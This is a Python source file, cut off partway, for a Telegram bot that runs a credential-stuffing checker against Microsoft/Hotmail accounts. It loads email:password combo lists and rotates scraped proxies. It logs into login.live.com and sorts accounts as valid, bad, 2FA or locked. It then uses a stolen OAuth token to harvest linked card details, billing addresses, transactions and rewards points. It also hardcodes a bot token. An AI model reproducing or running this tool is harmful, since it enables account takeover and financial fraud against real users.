import threading
import queue
import requests
import re
import json
import time
import os
import shutil
import random
from urllib.parse import unquote, quote
import telebot
from telebot.types import MessageEntity, InlineKeyboardMarkup, InlineKeyboardButton

# ---------- CONFIGURATION ----------
TOKEN = "8546104943:AAEDyvR1xxw8YfHpc-c4TCi0Ko3iuCt9f1g"
ADMIN_ID = 7265489223

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ---------- EXACT CHECKER CONSTANTS FROM API CODE ----------
anasMax = 10
anasTimeOut = 15
anasMaxPer = 100
anasPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
anasBK = "1665024852"
anasUAID = "a5b22c26bc704002ac309462e8d061bb"

# ---------- PROXY MANAGER ----------
class ProxyManager:
    def __init__(self):
        self.proxies = []          # list of working proxy strings (e.g., "http://1.2.3.4:8080")
        self.lock = threading.Lock()
        self.last_refresh = 0
        self.refresh_interval = 300  # 5 minutes
        self.running = True
        self.refresh_thread = threading.Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()

    def _auto_refresh(self):
        while self.running:
            self.refresh()
            time.sleep(self.refresh_interval)

    def refresh(self):
        """Scrape proxies from the web and test them."""
        print("[PROXY] Refreshing proxy pool...")
        scraped = self._scrape_proxies()
        if not scraped:
            print("[PROXY] No proxies scraped.")
            return
        working = []
        for proxy in scraped:
            if self._test_proxy(proxy):
                working.append(proxy)
        with self.lock:
            self.proxies = working
            self.last_refresh = time.time()
        print(f"[PROXY] Pool updated: {len(working)} working proxies.")

    def _scrape_proxies(self):
        """Scrape proxies from multiple free sources."""
        proxies = []
        sources = [
            "https://www.sslproxies.org/",
            "https://free-proxy-list.net/",
            "https://www.us-proxy.org/",
            "https://www.socks-proxy.net/"
        ]
        for url in sources:
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    # Simple regex to find IP:port in table rows
                    matches = re.findall(r'<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>', r.text)
                    for ip, port in matches:
                        proxies.append(f"http://{ip}:{port}")
            except:
                continue
        # Remove duplicates
        proxies = list(set(proxies))
        return proxies

    def _test_proxy(self, proxy):
        """Test if proxy works by requesting httpbin.org/ip."""
        try:
            test_url = "http://httpbin.org/ip"
            proxies_dict = {"http": proxy, "https": proxy}
            r = requests.get(test_url, proxies=proxies_dict, timeout=10)
            if r.status_code == 200:
                return True
        except:
            pass
        return False

    def get_proxy(self):
        """Return a random working proxy, or None if none available."""
        with self.lock:
            if self.proxies:
                return random.choice(self.proxies)
        return None

    def remove_proxy(self, proxy):
        """Remove a dead proxy from the pool."""
        with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)

# Global proxy manager instance
proxy_manager = ProxyManager()

# ---------- EXACT HELPER FUNCTIONS FROM API CODE ----------
def anasxzer00(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

def anasJsonKey(source_text, key, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        data = json.loads(source_text)
        if key in data:
            value = data[key]
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except json.JSONDecodeError:
        if create_empty:
            variables[var_name] = ""
        return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

def anasRetries(session, method, url, step_name, retries_counter_list, **kwargs):
    for attempt in range(anasMaxPer + 1):
        try:
            response = session.request(method, url, timeout=anasTimeOut, **kwargs)
            return response
        except (requests.exceptions.ProxyError, requests.exceptions.SSLError) as e:
            if retries_counter_list:
                 retries_counter_list[0] +=1
            raise
        except requests.exceptions.RequestException as e:
            if attempt < anasMaxPer:
                if retries_counter_list:
                    retries_counter_list[0] += 1
                time.sleep(1 + attempt)
                continue
            else:
                raise
    return None

# ---------- EXACT CHECKER FUNCTION FROM API CODE ----------
def anasChkAccount(user_pass_line, proxy_dict_for_session):
    user, password = user_pass_line.split(':', 1)
    
    variables = {'USER': user, 'PASS': password}
    captures = {}
    current_status_internal = "UNKNOWN_INIT"
    account_retry_attempts = [0] 

    session = requests.Session()
    if proxy_dict_for_session:
        session.proxies = proxy_dict_for_session
    try:
        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(variables['USER'])}&contextid=2CCDB02DC526CA71&bk={anasBK}&uaid={anasUAID}&pid=15216"
        
        payload_login_template = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>"
        payload_login = payload_login_template.replace("<USER>", variables['USER']) \
                                              .replace("<PASS>", variables['PASS']) \
                                              .replace("{ppft}", anasPPFT)

        headers_login = {
            "Host": "login.live.com",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={anasUAID}&display=touch&username={quote(variables['USER'])}",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"
        }
        
        response_login = anasRetries(session, 'POST', url_login, "Login", account_retry_attempts, headers=headers_login, data=payload_login, allow_redirects=True)
        if not response_login: return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
        response_text = response_login.text
        response_url = response_login.url

        if "Your account or password is incorrect." in response_text or \
           "That Microsoft account doesn\\'t exist. Enter a different account" in response_text or \
           ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url and "oauth20_desktop.srf?" not in response_url) :
            current_status_internal = "FAILURE_CREDENTIALS"
        elif ",AC:null,urlFedConvertRename" in response_text:
            current_status_internal = "BAN_LOCKED"
        elif "timed out" in response_text.lower():
            current_status_internal = "FAILURE_TIMEOUT_MSG"
        elif "account.live.com/recover" in response_text or \
             "account.live.com/identity/confirm" in response_text or \
             "Email/Confirm" in response_text:
            current_status_internal = "2FACTOR_VERIFICATION"
        elif "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
            current_status_internal = "CUSTOM_LOCK_ABUSE"
        else:
            success_cookie_found = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
            successful_redirect = "oauth20_desktop.srf#access_token=" in response_url or \
                                  "https://login.live.com/oauth20_desktop.srf?" in response_url
            
            if successful_redirect or success_cookie_found:
                current_status_internal = "SUCCESS_LOGIN_STEP"
            elif response_login.status_code == 200 and "https://login.live.com/ppsecure/post.srf" in response_url and not success_cookie_found:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN_STUCK_ON_POST"
            else:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN"


    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
    if current_status_internal != "SUCCESS_LOGIN_STEP":
        if current_status_internal == "FAILURE_CREDENTIALS": return "BAD_CREDENTIALS", None, account_retry_attempts[0]
        if current_status_internal == "2FACTOR_VERIFICATION": return "2FA_REQUIRED", None, account_retry_attempts[0]
        if current_status_internal in ["BAN_LOCKED", "CUSTOM_LOCK_ABUSE"]: return "ACCOUNT_ISSUE", None, account_retry_attempts[0]
        return "LOGIN_FAILED_OTHER", None, account_retry_attempts[0]
    try:
        url_oauth_auth = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
        headers_oauth_auth = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://account.microsoft.com/"
        }
        response_oauth_auth = anasRetries(session, 'GET', url_oauth_auth, "OAuth", account_retry_attempts, headers=headers_oauth_auth, allow_redirects=True)
        if not response_oauth_auth: return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]

        token_found_in_url = False
        if "access_token=" in response_oauth_auth.url:
            if anasxzer00(response_oauth_auth.url, "access_token=", "&token_type", "Token", variables):
                token_found_in_url = True
        
        if not token_found_in_url:
            return "TOKEN_ERROR_OAUTH_PARSE", None, account_retry_attempts[0]
        
        if variables.get("Token"):
            variables["Token_decoded"] = unquote(variables["Token"]) 
        else: 
            return "TOKEN_ERROR_OAUTH_MISSING", None, account_retry_attempts[0]
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]
    payment_api_response_status = "UNKNOWN_PAYMENT_API"
    try:
        if not variables.get("Token"):
            return "TOKEN_ERROR_MISSING_FOR_PAYMENT", None, account_retry_attempts[0]
        url_payment_instruments = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        headers_payment_instruments = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
            "Content-Type": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty", 
            "Sec-Fetch-Mode": "cors", 
            "Sec-Fetch-Site": "same-site",
        }
        response_payment_instruments = anasRetries(session, 'GET', url_payment_instruments, "PaymentInstruments", account_retry_attempts, headers=headers_payment_instruments)
        if not response_payment_instruments: return "NETWORK_ERROR_PAYMENT_INSTRUMENTS", None, account_retry_attempts[0]
        payment_data_text = response_payment_instruments.text
        if response_payment_instruments.status_code == 200:
            anasxzer00(payment_data_text, 'balance":', ',"', "Balance", variables, prefix="$")
            anasxzer00(payment_data_text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"', "CardTypeLast4", variables) # Card type + last4
            anasxzer00(payment_data_text, 'accountHolderName":"', '","', "AccountHolderName", variables)
            anasxzer00(payment_data_text, '"postal_code":"', '",', "Zipcode", variables)
            anasxzer00(payment_data_text, '"region":"', '",', "Region", variables)
            anasxzer00(payment_data_text, '"address_line1":"', '",', "Address1", variables)
            anasxzer00(payment_data_text, '"city":"', '",', "City", variables)
            captures["Address"] = f"[ Address: {variables.get('Address1', 'N/A')}, City: {variables.get('City', 'N/A')}, State: {variables.get('Region', 'N/A')}, Postalcode: {variables.get('Zipcode', 'N/A')} ]"            
            if not variables.get("CardTypeLast4") and not variables.get("Balance"):
                payment_api_response_status = "SUCCESS_PAYMENT_NO_INFO"
            else:
                payment_api_response_status = "SUCCESS_PAYMENT_INFO"
        elif response_payment_instruments.status_code == 401:
            return "PAYMENT_API_ERROR_UNAUTHORIZED", None, account_retry_attempts[0]
        else:
            return "PAYMENT_API_ERROR_OTHER", None, account_retry_attempts[0]

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_PAYMENT_INSTRUMENTS", None, account_retry_attempts[0]
    transaction_api_response_status = "SKIPPED_TRANSACTIONS"
    if payment_api_response_status in ["SUCCESS_PAYMENT_INFO", "SUCCESS_PAYMENT_NO_INFO"]:
        try:
            url_payment_transactions = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            headers_payment_transactions = headers_payment_instruments 
            response_payment_transactions = anasRetries(session, 'GET', url_payment_transactions, "PaymentTransactions", account_retry_attempts, headers=headers_payment_transactions)
            if not response_payment_transactions: return "NETWORK_ERROR_TRANSACTIONS", None, account_retry_attempts[0]

            transactions_data_text = response_payment_transactions.text
            if response_payment_transactions.status_code == 200:
                anasxzer00(transactions_data_text, 'country":"', '"}', "Country", variables)
                anasxzer00(transactions_data_text, 'title":"', '",', "Item 1", variables) 
                anasxzer00(transactions_data_text, '"autoRenew":', ',', "autoRenew", variables)
                anasxzer00(transactions_data_text, '"startDate":"', 'T', "startDate", variables)
                anasxzer00(transactions_data_text, '"nextRenewalDate":"', 'T', "nextRenewalDate", variables)
                anasxzer00(transactions_data_text, 'description":"', '",', "TransactionDescription", variables)
                anasJsonKey(transactions_data_text, "quantity", "Quantity_json", variables)
                anasJsonKey(transactions_data_text, "currency", "CURRENCY", variables)
                temp_total_amount = {} 
                if anasJsonKey(transactions_data_text, "totalAmount", "totalAmount_json", temp_total_amount):
                     variables["totalAmount_json_formatted"] = f"{variables.get('CURRENCY','')} {temp_total_amount['totalAmount_json']}"
                
                transaction_api_response_status = "SUCCESS_TRANSACTIONS_PARSED"

            elif response_payment_transactions.status_code == 401:
                 return "TRANSACTION_API_ERROR_UNAUTHORIZED", None, account_retry_attempts[0]
            else:
                 return "TRANSACTION_API_ERROR_OTHER", None, account_retry_attempts[0]
        
        except requests.exceptions.ProxyError:
            return "PROXY_ERROR", None, account_retry_attempts[0]
        except requests.exceptions.RequestException:
            return "NETWORK_ERROR_TRANSACTIONS", None, account_retry_attempts[0]    
    try:
        url_rewards = "https://rewards.bing.com/"
        headers_rewards = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
        }
        response_rewards = anasRetries(session, 'GET', url_rewards, "Rewards", account_retry_attempts, headers=headers_rewards, allow_redirects=True)
        if response_rewards : 
            rewards_data_text = response_rewards.text
            if anasxzer00(rewards_data_text, ',"availablePoints":', ',"', "points_val", variables, create_empty=False):
                captures["points"] = variables["points_val"]
            elif anasxzer00(rewards_data_text, 'pointsAvailable":', ',', "points_val", variables, create_empty=False):
                captures["points"] = variables["points_val"]
            else:
                captures["points"] = "N/A"
        else:
            captures["points"] = "N/A (Error)"

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        captures["points"] = "N/A (Error)"
    if payment_api_response_status.startswith("SUCCESS") or transaction_api_response_status.startswith("SUCCESS_TRANSACTIONS_PARSED"):
        country = variables.get("Country", "N/A")
        acc_holder_name_val = variables.get("AccountHolderName", "")
        card_holder_name_str = acc_holder_name_val if acc_holder_name_val and acc_holder_name_val != "N/A" else "No CC Linked"
        
        cc_funding = variables.get("Balance", "N/A")
        
        item1 = variables.get("Item 1", "N/A")
        purchased_items_str = f"[{item1}]" if item1 != "N/A" else "[N/A]"
        auto_renew_val = variables.get("autoRenew", "N/A").lower()
        auto_renew_str = "Yes" if auto_renew_val == "true" else ("No" if auto_renew_val == "false" else "N/A")
        
        start_date = variables.get("startDate", "N/A")
        end_date = variables.get("nextRenewalDate", "N/A")
        points = captures.get("points", "N/A") 
        hit_string = (
            f"{user_pass_line} | Country = {country} | CardHolder = {card_holder_name_str} | "
            f"CC Funding = {cc_funding} | Purchased Items = {purchased_items_str} | "
            f"Auto Renew = {auto_renew_str} | Start in = {start_date} | End in = {end_date} | "
            f"By = @anasxzer00"
        )
        return "HIT", hit_string, account_retry_attempts[0]
    else:
        return "POST_LOGIN_FAILURE_NO_DATA", None, account_retry_attempts[0]

# ---------- BOT SETUP ----------
active_sessions = {}
user_states = {}

def extract_combos(text):
    lines = text.strip().split('\n')
    combos = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('http'):
            continue
        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s|]+)', line)
        if match:
            email = match.group(1).strip()
            password = match.group(2).strip()
            combos.append(f"{email}:{password}")
        else:
            if ':' in line:
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].split()[0].split('|')[0].strip()
                if '@' in email and password:
                    combos.append(f"{email}:{password}")
    return combos

def load_proxies_from_text(text):
    proxies = []
    lines = text.strip().splitlines()
    if not lines:
        return []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if re.match(r'^(http|https|socks4|socks5)://', line, re.IGNORECASE):
            proxies.append(line)
        else:
            proxies.append(f"http://{line}")  # assume http
    return proxies

class CheckerSession:
    def __init__(self, chat_id, message_id, combos, threads_count, use_default_proxies=False, custom_proxies=None):
        self.chat_id = chat_id
        self.message_id = message_id
        self.combos = combos
        self.threads_count = threads_count
        self.use_default_proxies = use_default_proxies
        self.custom_proxies = custom_proxies if custom_proxies else []
        self.total = len(combos)
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.unknown = 0
        self.checked = 0
        self.retries = 0
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.hit_lines = []
        self.bad_lines = []
        self.twofa_lines = []
        self.unknown_lines = []
        self.current_checking = ""
        self.last_update_time = 0
        self.combo_queue = queue.Queue()
        for c in combos:
            self.combo_queue.put(c)

    def get_proxy_dict(self):
        """Return a proxy dict for requests, or None."""
        if self.custom_proxies:
            # Use custom proxies (round-robin)
            proxy = random.choice(self.custom_proxies)
            return {'http': proxy, 'https': proxy}
        elif self.use_default_proxies:
            # Use auto-scraped proxy manager
            proxy = proxy_manager.get_proxy()
            if proxy:
                return {'http': proxy, 'https': proxy}
        # No proxy available
        return None

    def report_proxy_failure(self, proxy_dict):
        """If proxy caused an error, remove it from pool."""
        if proxy_dict and self.use_default_proxies:
            # extract proxy string
            proxy_str = proxy_dict.get('http') or proxy_dict.get('https')
            if proxy_str:
                proxy_manager.remove_proxy(proxy_str)

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed < 1:
            return 0
        return int((self.checked / elapsed) * 60)

    def get_progress_pct(self):
        if self.total == 0:
            return 0.0
        return round((self.checked / self.total) * 100, 1)

    def get_success_rate(self):
        if self.checked == 0:
            return 0.0
        return round((self.hits / self.checked) * 100, 1)

def build_status_text(s, finished=False):
    pct = s.get_progress_pct()
    cpm = s.get_cpm()
    bar_len = 20
    filled = int(bar_len * pct / 100) if pct > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    elapsed = time.time() - s.start_time
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    status_word = "FINISHED" if finished else "CHECKING"
    current_email = s.current_checking if s.current_checking else "Waiting..."
    if len(current_email) > 30:
        current_email = current_email[:27] + "..."

    # Show proxy info
    if s.custom_proxies:
        proxy_info = f"Custom: {len(s.custom_proxies)}"
    elif s.use_default_proxies:
        with proxy_manager.lock:
            proxy_info = f"Auto: {len(proxy_manager.proxies)} live"
    else:
        proxy_info = "None"

    text = (
        f"🩸 𝗧𝗜𝗥𝗞𝗔𝗘 𝗛𝗢𝗧𝗠𝗔𝗜𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ 𝗦𝗧𝗔𝗧𝗨𝗦 : <code>{status_word}</code>\n"
        f"🔥 𝗧𝗛𝗥𝗘𝗔𝗗𝗦 : <code>{s.threads_count}</code>\n"
        f"🌐 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 : <code>{proxy_info}</code>\n"
        f"🕐 𝗘𝗟𝗔𝗣𝗦𝗘𝗗 : <code>{mins}m {secs}s</code>\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 💀 𝗟𝗜𝗩𝗘 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦              │\n"
        f"├──────────────────────────┤\n"
        f"│ ✅ 𝗛𝗶𝘁𝘀    │ <code>{s.hits}</code>\n"
        f"│ ❌ 𝗕𝗮𝗱     │ <code>{s.bad}</code>\n"
        f"│ 🔐 𝟮𝗙𝗔     │ <code>{s.twofa}</code>\n"
        f"│ ❓ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻 │ <code>{s.unknown}</code>\n"
        f"│ 🔄 𝗥𝗲𝘁𝗿𝗶𝗲𝘀 │ <code>{s.retries}</code>\n"
        f"├──────────────────────────┤\n"
        f"│ ⚡ 𝗖𝗣𝗠 : <code>{cpm}</code>\n"
        f"├──────────────────────────┤\n"
        f"│ 📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: <code>{pct}%</code> │ <code>{s.checked}/{s.total}</code>\n"
        f"│ <code>{bar}</code>\n"
        f"├──────────────────────────┤\n"
        f"│ 🔍 <code>{current_email}</code>\n"
        f"└──────────────────────────┘\n"
    )
    return text

def build_summary_text(s):
    elapsed = time.time() - s.start_time
    mins = int(elapsed // 60)
